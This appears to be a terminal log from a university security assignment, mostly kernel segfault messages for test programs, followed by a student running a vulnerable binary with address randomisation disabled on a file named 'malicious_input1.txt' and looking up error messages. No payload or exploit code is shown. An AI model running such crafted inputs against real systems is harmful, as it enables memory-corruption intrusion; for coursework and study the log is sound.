[5344759.688364] quickselect[7570]: segfault at 7ffeb0665ff8 ip 00000000004020cf sp 00007ffeb0666000 error 6 in quickselect[400000+4000]
[5344793.738212] quickselect[7830]: segfault at 7fff04867ff8 ip 00000000004020eb sp 00007fff04867ff0 error 6 in quickselect[400000+4000]
[5344793.945684] quickselect[7850]: segfault at 7ffc7ae94ff8 ip 00000000004020eb sp 00007ffc7ae94ff0 error 6 in quickselect[400000+4000]
[5344794.281824] quickselect[7908]: segfault at 7ffd2d5f1ff8 ip 0000000000402109 sp 00007ffd2d5f2000 error 6 in quickselect[400000+4000]
[5344794.621074] quickselect[7966]: segfault at 7ffcdd0dcff8 ip 0000000000402109 sp 00007ffcdd0dd000 error 6 in quickselect[400000+4000]
[5344794.828765] quickselect[7986]: segfault at 7ffd1b9a5fe8 ip 00000000004020eb sp 00007ffd1b9a5fe0 error 6 in quickselect[400000+4000]
[5344795.042915] quickselect[8006]: segfault at 7ffd5887bff8 ip 00000000004020d9 sp 00007ffd5887c000 error 6 in quickselect[400000+4000]
[5344795.256832] quickselect[8026]: segfault at 7ffd608a2ff8 ip 00000000004020eb sp 00007ffd608a2ff0 error 6 in quickselect[400000+4000]
[5344795.467859] quickselect[8046]: segfault at 7ffffa782ff8 ip 00000000004020d9 sp 00007ffffa783000 error 6 in quickselect[400000+4000]
[5344795.680412] quickselect[8066]: segfault at 7ffdd1c0fff8 ip 00000000004020d9 sp 00007ffdd1c10000 error 6 in quickselect[400000+4000]
[5344819.442477] quickselect[8364]: segfault at 7ffe1b557ff8 ip 00000000004020d9 sp 00007ffe1b558000 error 6 in quickselect[400000+4000]
[5344819.687679] quickselect[8403]: segfault at 7ffd1e647ff8 ip 0000000000402109 sp 00007ffd1e648000 error 6 in quickselect[400000+4000]
[5344819.879761] quickselect[8423]: segfault at 7ffe7d6f5fe8 ip 00000000004020eb sp 00007ffe7d6f5fe0 error 6 in quickselect[400000+4000]
[5344820.194933] quickselect[8501]: segfault at 7fffe054fff8 ip 00000000004020eb sp 00007fffe054fff0 error 6 in quickselect[400000+4000]
[5344820.389063] quickselect[8522]: segfault at 7ffcea0b6ff8 ip 0000000000402109 sp 00007ffcea0b7000 error 6 in quickselect[400000+4000]
[5344820.555668] quickselect[8542]: segfault at 7ffe1c84eff8 ip 00000000004020d9 sp 00007ffe1c84f000 error 6 in quickselect[400000+4000]
[5344820.716808] quickselect[8564]: segfault at 7fffd829dfe8 ip 00000000004020eb sp 00007fffd829dfe0 error 6 in quickselect[400000+4000]
[5344921.147294] quickselect[8877]: segfault at 7ffdc7fb5ff8 ip 00000000004020c4 sp 00007ffdc7fb5ff0 error 6 in quickselect[400000+4000]
[5344921.413433] quickselect[8916]: segfault at 7fffdc091ff8 ip 00000000004020b2 sp 00007fffdc092000 error 6 in quickselect[400000+4000]
[5344921.599338] quickselect[8936]: segfault at 7ffc28d85ff8 ip 00000000004018cd sp 00007ffc28d86000 error 6 in quickselect[400000+4000]
[5344921.908967] quickselect[9014]: segfault at 7ffed6ac0ff8 ip 00000000004018cd sp 00007ffed6ac1000 error 6 in quickselect[400000+4000]
[5344922.125838] quickselect[9034]: segfault at 7ffdd5327ff8 ip 00000000004020b2 sp 00007ffdd5328000 error 6 in quickselect[400000+4000]
[5344922.611478] quickselect[9054]: segfault at 7ffdf9093fe8 ip 00000000004020c4 sp 00007ffdf9093fe0 error 6 in quickselect[400000+4000]
[5344922.829938] quickselect[9074]: segfault at 7ffe2501eff8 ip 00000000004020e2 sp 00007ffe2501f000 error 6 in quickselect[400000+4000]
[5345007.406589] quickselect[9385]: segfault at 7ffefe9c2ff8 ip 00000000004020e9 sp 00007ffefe9c3000 error 6 in quickselect[400000+4000]
[5345008.024426] quickselect[9424]: segfault at 7ffcbb7b7ff8 ip 00000000004020e9 sp 00007ffcbb7b8000 error 6 in quickselect[400000+4000]
[5345008.220882] quickselect[9444]: segfault at 7fffe5d27fe8 ip 00000000004020cb sp 00007fffe5d27fe0 error 6 in quickselect[400000+4000]
[5345008.548646] quickselect[9521]: segfault at 7fff120f8ff8 ip 00000000004020b9 sp 00007fff120f9000 error 6 in quickselect[400000+4000]
[5345008.706078] quickselect[9541]: segfault at 7ffe69404fe8 ip 00000000004020cb sp 00007ffe69404fe0 error 6 in quickselect[400000+4000]
[5345008.865271] quickselect[9561]: segfault at 7fffbf28fff8 ip 00000000004018cb sp 00007fffbf290000 error 6 in quickselect[400000+4000]
[5345009.031726] quickselect[9581]: segfault at 7fff2a1edff8 ip 00000000004020b9 sp 00007fff2a1ee000 error 6 in quickselect[400000+4000]
[5345100.528317] quickselect[9893]: segfault at 7fff5d821fe8 ip 00000000004020c4 sp 00007fff5d821fe0 error 6 in quickselect[400000+4000]
[5345100.780736] quickselect[9932]: segfault at 7fff46b67ff8 ip 00000000004020b2 sp 00007fff46b68000 error 6 in quickselect[400000+4000]
[5345100.952928] quickselect[9952]: segfault at 7ffd5c58aff8 ip 00000000004020c4 sp 00007ffd5c58aff0 error 6 in quickselect[400000+4000]
[5345101.301705] quickselect[10029]: segfault at 7ffcc39ccff8 ip 00000000004020b2 sp 00007ffcc39cd000 error 6 in quickselect[400000+4000]
[5345101.487923] quickselect[10049]: segfault at 7ffce15dcff8 ip 00000000004020e2 sp 00007ffce15dd000 error 6 in quickselect[400000+4000]
[5345101.687016] quickselect[10069]: segfault at 7ffcb3e50ff8 ip 00000000004018cd sp 00007ffcb3e51000 error 6 in quickselect[400000+4000]
[5345101.881709] quickselect[10089]: segfault at 7fff0138bff8 ip 00000000004020e2 sp 00007fff0138c000 error 6 in quickselect[400000+4000]
[5345236.812724] quickselect[10401]: segfault at 7ffc23b54ff8 ip 00000000004020e2 sp 00007ffc23b55000 error 6 in quickselect[400000+4000]
[5345237.043919] quickselect[10440]: segfault at 7ffe9a029ff8 ip 00000000004018cd sp 00007ffe9a02a000 error 6 in quickselect[400000+4000]
[5345237.222058] quickselect[10460]: segfault at 7ffeb1ae9ff8 ip 00000000004020b2 sp 00007ffeb1aea000 error 6 in quickselect[400000+4000]
[5345237.591797] quickselect[10537]: segfault at 7ffff692cff8 ip 00000000004020e2 sp 00007ffff692d000 error 6 in quickselect[400000+4000]
[5345237.815128] quickselect[10557]: segfault at 7ffd9a973ff8 ip 00000000004018cd sp 00007ffd9a974000 error 6 in quickselect[400000+4000]
[5345238.016738] quickselect[10577]: segfault at 7ffe8f403fe8 ip 00000000004020c4 sp 00007ffe8f403fe0 error 6 in quickselect[400000+4000]
[5345238.248179] quickselect[10597]: segfault at 7ffe0dc01ff8 ip 00000000004020b2 sp 00007ffe0dc02000 error 6 in quickselect[400000+4000]
[5345298.359651] quickselect[10899]: segfault at 7ffdc5f44fe8 ip 000000000040180e sp 00007ffdc5f44fd0 error 6 in quickselect[400000+4000]
[5345298.870691] quickselect[10938]: segfault at 7ffe983caff8 ip 000000000040180e sp 00007ffe983cafe0 error 6 in quickselect[400000+4000]
[5345299.117725] quickselect[10958]: segfault at 7fffba37aff8 ip 00000000004018d2 sp 00007fffba37b000 error 6 in quickselect[400000+4000]
[5345299.502640] quickselect[11036]: segfault at 7ffc6c4b7fe8 ip 000000000040180e sp 00007ffc6c4b7fd0 error 6 in quickselect[400000+4000]
[5345299.710177] quickselect[11056]: segfault at 7ffec3966fe8 ip 000000000040180e sp 00007ffec3966fd0 error 6 in quickselect[400000+4000]
[5345299.885624] quickselect[11076]: segfault at 7ffdb5c85fe8 ip 000000000040180e sp 00007ffdb5c85fd0 error 6 in quickselect[400000+4000]
[5345300.073913] quickselect[11096]: segfault at 7ffd288abff8 ip 00000000004018b8 sp 00007ffd288abff0 error 6 in quickselect[400000+4000]
[5345480.159770] quickselect[11422]: segfault at 7ffc16b37ff8 ip 00000000004020f4 sp 00007ffc16b37ff0 error 6 in quickselect[400000+4000]
[5345480.400776] quickselect[11461]: segfault at 7ffd99ffcff8 ip 00000000004020f4 sp 00007ffd99ffcff0 error 6 in quickselect[400000+4000]
[5345480.602404] quickselect[11481]: segfault at 7fff65b4fff8 ip 00000000004020e2 sp 00007fff65b50000 error 6 in quickselect[400000+4000]
[5345480.934595] quickselect[11558]: segfault at 7ffc18f38ff8 ip 00000000004020f4 sp 00007ffc18f38ff0 error 6 in quickselect[400000+4000]
[5345481.145882] quickselect[11578]: segfault at 7ffec6df7ff8 ip 00000000004020e2 sp 00007ffec6df8000 error 6 in quickselect[400000+4000]
[5345481.342496] quickselect[11598]: segfault at 7fff445c7ff8 ip 00000000004020f4 sp 00007fff445c7ff0 error 6 in quickselect[400000+4000]
[5345481.525645] quickselect[11618]: segfault at 7fff179edff8 ip 00000000004020e2 sp 00007fff179ee000 error 6 in quickselect[400000+4000]
[5345585.385622] quickselect[11948]: segfault at 7ffd2b63bff8 ip 00007f5abd5bc1ed sp 00007ffd2b63c000 error 6 in libc-2.23.so[7f5abd543000+1c0000]
[5345587.267450] quickselect[11988]: segfault at 7fff6d472ff8 ip 00007f620e7f01f1 sp 00007fff6d473000 error 6 in libc-2.23.so[7f620e777000+1c0000]
[5345590.241019] quickselect[12009]: segfault at 7ffd8d0acff8 ip 00007f8c26ca37b8 sp 00007ffd8d0ad000 error 6 in libc-2.23.so[7f8c26c35000+1c0000]
[5345595.543444] quickselect[12087]: segfault at 7ffcac69dff8 ip 00007f2f11e487b8 sp 00007ffcac69e000 error 6 in libc-2.23.so[7f2f11dda000+1c0000]
[5347294.686165] quickselect[19365]: segfault at c22000 ip 00000000004017dd sp 00007ffe5c6badb0 error 4 in quickselect[400000+4000]
[5347295.043560] quickselect[19404]: segfault at 1539000 ip 00000000004017dd sp 00007ffd43d2af30 error 4 in quickselect[400000+4000]
[5347295.335814] quickselect[19424]: segfault at 1641000 ip 00000000004017dd sp 00007ffc6200c1f0 error 4 in quickselect[400000+4000]
[5347424.194025] quickselect[19878]: segfault at b93000 ip 0000000000401b7a sp 00007ffe9aba6cb0 error 4 in quickselect[400000+3000]
[5347424.447761] quickselect[19917]: segfault at 71d000 ip 0000000000401b7a sp 00007ffe77820dd0 error 4 in quickselect[400000+3000]
[5347424.650980] quickselect[19937]: segfault at 134e000 ip 0000000000401b7a sp 00007ffe6cbdc0c0 error 4 in quickselect[400000+3000]
[5347428.976348] quickselect[20017]: segfault at 7f03fcb69000 ip 0000000000401b7a sp 00007ffe05ed5a90 error 4 in quickselect[400000+3000]
[5364341.727672] vuln_prog3.bin[26377]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ff9901a0 error 14
[5364360.338640] vuln_prog3.bin[26387]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ff906ea0 error 14
[5370049.130265] vuln_prog3.bin[818]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffd490 error 14
[5374148.035213] vuln_prog3.bin[4006]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ff9eb770 error 14
[5374842.163942] quickselect[4625]: segfault at 7ffdc4ee7ff8 ip 0000000000401edb sp 00007ffdc4ee8000 error 6 in quickselect[400000+4000]
[5374842.365294] quickselect[4645]: segfault at 7fff72b92ff8 ip 0000000000401eab sp 00007fff72b93000 error 6 in quickselect[400000+4000]
[5374842.575339] quickselect[4665]: segfault at 7ffd80316ff8 ip 0000000000401edb sp 00007ffd80317000 error 6 in quickselect[400000+4000]
[5374842.785218] quickselect[4685]: segfault at 7ffe39ad4ff8 ip 0000000000401edb sp 00007ffe39ad5000 error 6 in quickselect[400000+4000]
[5374842.995985] quickselect[4705]: segfault at 7ffdfe0acff8 ip 0000000000401eab sp 00007ffdfe0ad000 error 6 in quickselect[400000+4000]
[5374843.218117] quickselect[4725]: segfault at 7ffc77092fe8 ip 0000000000401ebd sp 00007ffc77092fe0 error 6 in quickselect[400000+4000]
[5374843.454081] quickselect[4745]: segfault at 7ffcab119ff8 ip 0000000000401edb sp 00007ffcab11a000 error 6 in quickselect[400000+4000]
[5374843.703497] quickselect[4765]: segfault at 7ffd7250eff8 ip 0000000000401edb sp 00007ffd7250f000 error 6 in quickselect[400000+4000]
[5374843.920677] quickselect[4785]: segfault at 7ffedf9a0ff8 ip 0000000000401ebd sp 00007ffedf9a0ff0 error 6 in quickselect[400000+4000]
[5374844.152983] quickselect[4805]: segfault at 7fff642c9ff8 ip 0000000000401eab sp 00007fff642ca000 error 6 in quickselect[400000+4000]
[5375056.043589] show_signal_msg: 1 callbacks suppressed
[5375056.043594] quickselect[5172]: segfault at 7fff8e4defe8 ip 0000000000401ebd sp 00007fff8e4defe0 error 6 in quickselect[400000+4000]
[5375056.253007] quickselect[5194]: segfault at 7fffdc17dff8 ip 0000000000401eab sp 00007fffdc17e000 error 6 in quickselect[400000+4000]
[5375056.471001] quickselect[5214]: segfault at 7ffce56e9ff8 ip 0000000000401eab sp 00007ffce56ea000 error 6 in quickselect[400000+4000]
[5375056.695192] quickselect[5234]: segfault at 7ffe15a63ff8 ip 0000000000401eab sp 00007ffe15a64000 error 6 in quickselect[400000+4000]
[5375056.943288] quickselect[5254]: segfault at 7ffc5288ffe8 ip 0000000000401ebd sp 00007ffc5288ffe0 error 6 in quickselect[400000+4000]
[5375057.187366] quickselect[5274]: segfault at 7fffde15cff8 ip 0000000000401edb sp 00007fffde15d000 error 6 in quickselect[400000+4000]
[5375057.456445] quickselect[5294]: segfault at 7fff8c8baff8 ip 0000000000401eab sp 00007fff8c8bb000 error 6 in quickselect[400000+4000]
[5375057.698804] quickselect[5314]: segfault at 7fff74ee4ff8 ip 0000000000401eab sp 00007fff74ee5000 error 6 in quickselect[400000+4000]
[5375057.940050] quickselect[5334]: segfault at 7ffe34983ff8 ip 0000000000401ebd sp 00007ffe34983ff0 error 6 in quickselect[400000+4000]
[5375058.189488] quickselect[5354]: segfault at 7ffddb83cff8 ip 0000000000401edb sp 00007ffddb83d000 error 6 in quickselect[400000+4000]
[5375243.523562] show_signal_msg: 1 callbacks suppressed
[5375243.523569] quickselect[5708]: segfault at 7ffef7771ff8 ip 0000000000401eab sp 00007ffef7772000 error 6 in quickselect[400000+4000]
[5375243.740524] quickselect[5728]: segfault at 7ffc4895dff8 ip 0000000000401eab sp 00007ffc4895e000 error 6 in quickselect[400000+4000]
[5375243.950164] quickselect[5748]: segfault at 7ffea1b0eff8 ip 0000000000401edb sp 00007ffea1b0f000 error 6 in quickselect[400000+4000]
[5375244.158123] quickselect[5768]: segfault at 7ffdaa4c0ff8 ip 0000000000401eab sp 00007ffdaa4c1000 error 6 in quickselect[400000+4000]
[5375244.376085] quickselect[5788]: segfault at 7ffd2e093ff8 ip 0000000000401eab sp 00007ffd2e094000 error 6 in quickselect[400000+4000]
[5375244.610100] quickselect[5808]: segfault at 7ffc31d77fe8 ip 0000000000401ebd sp 00007ffc31d77fe0 error 6 in quickselect[400000+4000]
[5375244.837348] quickselect[5828]: segfault at 7ffdf731bfe8 ip 0000000000401ebd sp 00007ffdf731bfe0 error 6 in quickselect[400000+4000]
[5375245.041367] quickselect[5849]: segfault at 7ffd6fb8aff8 ip 0000000000401eab sp 00007ffd6fb8b000 error 6 in quickselect[400000+4000]
[5375245.282294] quickselect[5870]: segfault at 7ffea6e22ff8 ip 0000000000401edb sp 00007ffea6e23000 error 6 in quickselect[400000+4000]
[5375245.544098] quickselect[5890]: segfault at 7fff34d85ff8 ip 0000000000401ebd sp 00007fff34d85ff0 error 6 in quickselect[400000+4000]
[5375554.060322] show_signal_msg: 1 callbacks suppressed
[5375554.060328] quickselect[6285]: segfault at 7fff8e175ff8 ip 0000000000401eab sp 00007fff8e176000 error 6 in quickselect[400000+4000]
[5375554.250896] quickselect[6305]: segfault at 7fff115e2fe8 ip 0000000000401ebd sp 00007fff115e2fe0 error 6 in quickselect[400000+4000]
[5375554.476088] quickselect[6325]: segfault at 7ffe5b1a6fe8 ip 0000000000401ebd sp 00007ffe5b1a6fe0 error 6 in quickselect[400000+4000]
[5375554.693993] quickselect[6345]: segfault at 7fffb76baff8 ip 0000000000401edb sp 00007fffb76bb000 error 6 in quickselect[400000+4000]
[5375554.916774] quickselect[6365]: segfault at 7ffec6639ff8 ip 0000000000401edb sp 00007ffec663a000 error 6 in quickselect[400000+4000]
[5375555.135923] quickselect[6385]: segfault at 7ffec1a6aff8 ip 0000000000401ebd sp 00007ffec1a6aff0 error 6 in quickselect[400000+4000]
[5375555.377326] quickselect[6405]: segfault at 7ffde61edfe8 ip 0000000000401ebd sp 00007ffde61edfe0 error 6 in quickselect[400000+4000]
[5375555.622101] quickselect[6425]: segfault at 7fff1cc24ff8 ip 0000000000401edb sp 00007fff1cc25000 error 6 in quickselect[400000+4000]
[5375555.864931] quickselect[6445]: segfault at 7ffe23035fe8 ip 0000000000401ebd sp 00007ffe23035fe0 error 6 in quickselect[400000+4000]
[5375556.181133] quickselect[6465]: segfault at 7ffe9642bff8 ip 0000000000401eab sp 00007ffe9642c000 error 6 in quickselect[400000+4000]
[5375862.104075] show_signal_msg: 1 callbacks suppressed
[5375862.104082] quickselect[6996]: segfault at 7fff6fc12fe8 ip 0000000000401ebd sp 00007fff6fc12fe0 error 6 in quickselect[400000+4000]
[5375862.328921] quickselect[7016]: segfault at 7ffc2e418ff8 ip 0000000000401edb sp 00007ffc2e419000 error 6 in quickselect[400000+4000]
[5375862.542482] quickselect[7036]: segfault at 7ffd9ffedff8 ip 0000000000401ebd sp 00007ffd9ffedff0 error 6 in quickselect[400000+4000]
[5375862.769215] quickselect[7056]: segfault at 7ffcd8637ff8 ip 0000000000401ebd sp 00007ffcd8637ff0 error 6 in quickselect[400000+4000]
[5375862.982312] quickselect[7078]: segfault at 7ffc8fd9bfe8 ip 0000000000401ebd sp 00007ffc8fd9bfe0 error 6 in quickselect[400000+4000]
[5375863.210719] quickselect[7099]: segfault at 7fff5bd16ff8 ip 0000000000401ebd sp 00007fff5bd16ff0 error 6 in quickselect[400000+4000]
[5375863.399405] quickselect[7119]: segfault at 7fffe1828ff8 ip 0000000000401eab sp 00007fffe1829000 error 6 in quickselect[400000+4000]
[5375863.591573] quickselect[7139]: segfault at 7fff6fb06ff8 ip 0000000000401ebd sp 00007fff6fb06ff0 error 6 in quickselect[400000+4000]
[5375863.815581] quickselect[7159]: segfault at 7ffe0863bff8 ip 0000000000401ebd sp 00007ffe0863bff0 error 6 in quickselect[400000+4000]
[5375864.046310] quickselect[7179]: segfault at 7ffd6c082ff8 ip 0000000000401ebd sp 00007ffd6c082ff0 error 6 in quickselect[400000+4000]
[5376009.151132] show_signal_msg: 1 callbacks suppressed
[5376009.151137] quickselect[7527]: segfault at 7ffdf6b45fe8 ip 0000000000401ebd sp 00007ffdf6b45fe0 error 6 in quickselect[400000+4000]
[5376009.337587] quickselect[7547]: segfault at 7ffd9b285ff8 ip 0000000000401eab sp 00007ffd9b286000 error 6 in quickselect[400000+4000]
[5376009.512008] quickselect[7567]: segfault at 7ffcae55fff8 ip 0000000000401edb sp 00007ffcae560000 error 6 in quickselect[400000+4000]
[5376009.700683] quickselect[7587]: segfault at 7ffcc2434ff8 ip 0000000000401edb sp 00007ffcc2435000 error 6 in quickselect[400000+4000]
[5376009.877501] quickselect[7607]: segfault at 7fff7363dff8 ip 0000000000401eab sp 00007fff7363e000 error 6 in quickselect[400000+4000]
[5376010.067525] quickselect[7627]: segfault at 7ffce0352ff8 ip 0000000000401edb sp 00007ffce0353000 error 6 in quickselect[400000+4000]
[5376010.284536] quickselect[7647]: segfault at 7fffe1395ff8 ip 0000000000401ebd sp 00007fffe1395ff0 error 6 in quickselect[400000+4000]
[5376010.465889] quickselect[7667]: segfault at 7ffc0f05efe8 ip 0000000000401ebd sp 00007ffc0f05efe0 error 6 in quickselect[400000+4000]
[5376010.672304] quickselect[7687]: segfault at 7fff52209fe8 ip 0000000000401ebd sp 00007fff52209fe0 error 6 in quickselect[400000+4000]
[5376010.906288] quickselect[7707]: segfault at 7ffc792a3ff8 ip 0000000000401edb sp 00007ffc792a4000 error 6 in quickselect[400000+4000]
[5379752.056760] show_signal_msg: 1 callbacks suppressed
[5379752.056766] vuln_prog3.bin[13987]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffe8d180 error 14
[5380141.678504] quickselect[15691]: segfault at b54000 ip 0000000000401b41 sp 00007ffc8c53f350 error 4 in quickselect[400000+3000]
[5380141.869444] quickselect[15713]: segfault at 10f0000 ip 0000000000401b41 sp 00007ffe27fa2d10 error 4 in quickselect[400000+3000]
[5380250.837945] quickselect[16631]: segfault at 7fff6a14aff8 ip 0000000000401b24 sp 00007fff6a14b000 error 6 in quickselect[400000+3000]
[5380251.032832] quickselect[16651]: segfault at 7ffca9534ff8 ip 0000000000401b24 sp 00007ffca9535000 error 6 in quickselect[400000+3000]
[5380251.429901] quickselect[16728]: segfault at 7fff951f0ff8 ip 0000000000401b24 sp 00007fff951f1000 error 6 in quickselect[400000+3000]
[5380251.762788] quickselect[16786]: segfault at 7ffcd07a6ff8 ip 0000000000401b24 sp 00007ffcd07a7000 error 6 in quickselect[400000+3000]
[5380252.248343] quickselect[16807]: segfault at 7ffdf8c1bfe8 ip 0000000000401bcf sp 00007ffdf8c1bff0 error 6 in quickselect[400000+3000]
[5380252.690336] quickselect[16828]: segfault at 7ffdaa492ff8 ip 0000000000401bcf sp 00007ffdaa493000 error 6 in quickselect[400000+3000]
[5380357.140440] quickselect[17257]: segfault at 2243000 ip 0000000000401b41 sp 00007ffe44c23400 error 4 in quickselect[400000+3000]
[5380357.323621] quickselect[17277]: segfault at 196d000 ip 0000000000401b41 sp 00007ffca1502030 error 4 in quickselect[400000+3000]
[5380371.895943] vuln_prog3.bin[17372]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffef53b0 error 14
[5380460.541703] quickselect[17751]: segfault at 210d000 ip 0000000000401b41 sp 00007ffe1ebfe540 error 4 in quickselect[400000+3000]
[5380460.875202] quickselect[17828]: segfault at 12dd000 ip 0000000000401b41 sp 00007ffe4528a7a0 error 4 in quickselect[400000+3000]
[5380461.064309] quickselect[17848]: segfault at eaa000 ip 0000000000401b41 sp 00007ffcae791c70 error 4 in quickselect[400000+3000]
[5387660.676225] vuln_prog3.bin[25912]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffde2920 error 14
[5402039.953415] quickselect[1100]: segfault at 83f000 ip 00000000004019a4 sp 00007ffdc155b168 error 4 in quickselect[400000+3000]
[5402040.134589] quickselect[1121]: segfault at 19c1000 ip 00000000004019a4 sp 00007ffe061d29d8 error 4 in quickselect[400000+3000]
[5402042.352294] quickselect[1154]: segfault at 160c000 ip 00000000004019a4 sp 00007fffdad858b8 error 4 in quickselect[400000+3000]
[5402044.656763] quickselect[1234]: segfault at 17e1000 ip 00000000004019a4 sp 00007ffe21ac3688 error 4 in quickselect[400000+3000]
[5402044.823487] quickselect[1254]: segfault at 89f000 ip 00000000004019a4 sp 00007ffd5efa7198 error 4 in quickselect[400000+3000]
[5402044.998765] quickselect[1274]: segfault at 7d4000 ip 00000000004019a4 sp 00007ffdb8c99aa8 error 4 in quickselect[400000+3000]
[5402045.452668] quickselect[1294]: segfault at b18000 ip 00000000004019a4 sp 00007ffe7147a858 error 4 in quickselect[400000+3000]
[5402050.611639] quickselect[1371]: segfault at 7f0299c5b000 ip 00000000004019a4 sp 00007ffcb0018998 error 4 in quickselect[400000+3000]
[5402605.447486] quickselect[3241]: segfault at 136a000 ip 00000000004019a7 sp 00007ffc75c4dfa0 error 4 in quickselect[400000+3000]
[5402605.608046] quickselect[3261]: segfault at 101d000 ip 00000000004019a7 sp 00007ffed9ed4630 error 4 in quickselect[400000+3000]
[5466277.678516] inversioncounte[30917]: segfault at 0 ip 0000000000401082 sp 00007ffe4b55f9d0 error 4 in inversioncounter[400000+2000]
[5466277.878314] inversioncounte[30937]: segfault at 0 ip 0000000000401082 sp 00007ffdb2591380 error 4 in inversioncounter[400000+2000]
[5466278.203804] inversioncounte[30995]: segfault at 0 ip 0000000000401082 sp 00007ffe8972af70 error 4 in inversioncounter[400000+2000]
[5466278.373537] inversioncounte[31015]: segfault at 0 ip 0000000000401082 sp 00007ffc67e2e7f0 error 4 in inversioncounter[400000+2000]
[5466326.125755] inversioncounte[31447]: segfault at 0 ip 0000000000401082 sp 00007fffe7866590 error 4 in inversioncounter[400000+2000]
[5466326.343467] inversioncounte[31467]: segfault at 0 ip 0000000000401082 sp 00007ffc37d03aa0 error 4 in inversioncounter[400000+2000]
[5466326.627075] inversioncounte[31525]: segfault at 0 ip 0000000000401082 sp 00007ffec4a683f0 error 4 in inversioncounter[400000+2000]
[5466326.836332] inversioncounte[31545]: segfault at 0 ip 0000000000401082 sp 00007ffc84596790 error 4 in inversioncounter[400000+2000]
[5466609.427289] inversioncounte[32154]: segfault at 0 ip 0000000000401082 sp 00007ffda815bdd0 error 4 in inversioncounter[400000+2000]
[5466609.618669] inversioncounte[32174]: segfault at 0 ip 0000000000401082 sp 00007fffdddfade0 error 4 in inversioncounter[400000+2000]
[5466610.306647] inversioncounte[32232]: segfault at 0 ip 0000000000401082 sp 00007ffee760a530 error 4 in inversioncounter[400000+2000]
[5466610.475529] inversioncounte[32252]: segfault at 0 ip 0000000000401082 sp 00007fff21feb540 error 4 in inversioncounter[400000+2000]
[5466672.024001] inversioncounte[32682]: segfault at 0 ip 0000000000401082 sp 00007ffed74e9ec0 error 4 in inversioncounter[400000+2000]
[5466672.228241] inversioncounte[32702]: segfault at 0 ip 0000000000401082 sp 00007ffc32693200 error 4 in inversioncounter[400000+2000]
[5466672.531745] inversioncounte[32760]: segfault at 0 ip 0000000000401082 sp 00007fffad958b90 error 4 in inversioncounter[400000+2000]
[5466672.682954] inversioncounte[312]: segfault at 0 ip 0000000000401082 sp 00007fff8e52e420 error 4 in inversioncounter[400000+2000]
[5467054.541029] inversioncounte[1037]: segfault at 0 ip 0000000000401082 sp 00007ffe44012400 error 4 in inversioncounter[400000+2000]
[5467054.735055] inversioncounte[1058]: segfault at 0 ip 0000000000401082 sp 00007ffcf0266d90 error 4 in inversioncounter[400000+2000]
[5467055.176714] inversioncounte[1117]: segfault at 0 ip 0000000000401082 sp 00007ffd53e1c620 error 4 in inversioncounter[400000+2000]
[5467055.626273] inversioncounte[1137]: segfault at 0 ip 0000000000401082 sp 00007ffd18ed7e10 error 4 in inversioncounter[400000+2000]
[5552150.175294] vuln_prog1.bin[31591]: segfault at 1ec ip 00007f75f87b1bc6 sp 00007ffeaf6d25d0 error 6 in libc-2.23.so[7f75f8765000+1c0000]
[5552158.937445] vuln_prog1.bin[31595]: segfault at 0 ip 00007ff40854abc6 sp 00007ffd58577860 error 6 in libc-2.23.so[7ff4084fe000+1c0000]
[5552207.448637] vuln_prog1.bin[31611]: segfault at 0 ip 00007fa68b3cfbc6 sp 00007fff06632060 error 6 in libc-2.23.so[7fa68b383000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ dmesg | grep 'vuln_prog1.bin' | less
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ dmesg | grep 'vuln_prog1.bin' | less
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ dmesg | tail -1
[5552207.448637] vuln_prog1.bin[31611]: segfault at 0 ip 00007fa68b3cfbc6 sp 00007fff06632060 error 6 in libc-2.23.so[7fa68b383000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ setarch x86_64 -R ./vuln_prog1.bin 104 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ dmesg | tail -1
[5552468.902021] vuln_prog1.bin[31694]: segfault at 0 ip 00007ffff7a59bc6 sp 00007fffffffcea0 error 6 in libc-2.23.so[7ffff7a0d000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ man fault
No manual entry for fault
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ man fault.c
No manual entry for fault.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate fault.c
/etc/fonts/conf.avail/11-lcdfilter-default.conf
/etc/fonts/conf.d/11-lcdfilter-default.conf
/etc/rsyslog.d/50-default.conf
/usr/share/alsa/pcm/default.conf
/usr/share/doc/texlive-doc/support/epspdf/default.css
/usr/share/popularity-contest/default.conf
/usr/share/rsyslog/50-default.conf
/var/lib/dpkg/info/oracle-java8-set-default.conffiles
/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate error.c
/usr/lib/python3/dist-packages/gi/__pycache__/_error.cpython-35.pyc
/usr/lib/python3.5/lib2to3/fixes/__pycache__/fix_standarderror.cpython-35.pyc
/usr/lib/python3.5/urllib/__pycache__/error.cpython-35.pyc
/usr/src/linux-headers-4.4.0-130/scripts/dtc/libfdt/fdt_strerror.c
/usr/src/linux-headers-4.4.0-133/scripts/dtc/libfdt/fdt_strerror.c
/usr/src/linux-headers-4.4.0-134/scripts/dtc/libfdt/fdt_strerror.c
/usr/src/linux-headers-4.4.0-137/scripts/dtc/libfdt/fdt_strerror.c
/usr/src/linux-headers-4.4.0-138/scripts/dtc/libfdt/fdt_strerror.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ man segfault
No manual entry for segfault
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ man error
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ locate error.h
/usr/include/error.h
